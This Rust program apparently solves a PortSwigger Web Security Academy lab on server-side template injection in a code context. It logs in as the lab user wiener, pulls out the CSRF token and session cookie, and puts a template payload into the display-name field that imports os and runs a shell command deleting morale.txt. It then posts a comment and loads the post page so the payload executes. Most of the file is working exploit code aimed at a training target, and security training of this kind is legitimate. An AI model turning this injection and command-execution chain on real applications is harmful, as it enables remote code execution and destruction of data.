/**************************************************************
*
* Lab: Basic server-side template injection (code context)
*
* Hack Steps:
*      1. Fetch the login page
*      2. Extract the csrf token and session cookie to login
*      3. Login as wiener
*      4. Fetch wiener's profile
*      5. Set the preferred name with the malicious payload
*      6. Post a comment as wiener
*      7. Fetch the post page to execute the payload
*
***************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a9b00e4037b47cc8055490b008c0087.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the csrf token and session cookie to login.. ");
    flush_terminal();

    let mut session = get_session_cookie(&login_page);
    let mut csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Logging in as wiener.. ");
    flush_terminal();

    let wiener_login = login_as_wiener(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗4⦘ Fetching wiener's profile.. ");
    flush_terminal();

    session = get_session_cookie(&wiener_login);
    let wiener_profile = fetch_with_session("/my-account", &session);

    println!("{}", "OK".green());
    print!("⦗5⦘ Setting the preferred name with the malicious payload.. ");
    flush_terminal();

    csrf_token = get_csrf_token(wiener_profile);
    let payload = r###"user.first_name}}{%import os;os.system('rm morale.txt')%}"###;
    set_preferred_name_with_payload(&session, &csrf_token, payload);

    println!("{}", "OK".green());
    print!("⦗6⦘ Posting a comment as wiener.. ");
    flush_terminal();

    post_comment(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗7⦘ Fetching the post page to execute the payload.. ");
    flush_terminal();

    fetch("/post?postId=1"); // postId should be the same as the one used in posting a comment

    println!("{}", "OK".green());
    println!("🗹 The morale.txt file is successfully deleted");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to fetch the login page".red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to fetch the login page".red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
}

fn set_preferred_name_with_payload(session: &str, csrf_token: &str, payload: &str) {
    WEB_CLIENT
        .post(format!(
            "{LAB_URL}/my-account/change-blog-post-author-display"
        ))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("csrf", csrf_token),
            ("blog-post-author-display", payload),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()));
}

fn post_comment(session: &str, csrf_token: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/post/comment"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("postId", "1"),
            ("comment", "to execute the malicious payload"),
            ("csrf", csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()));
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
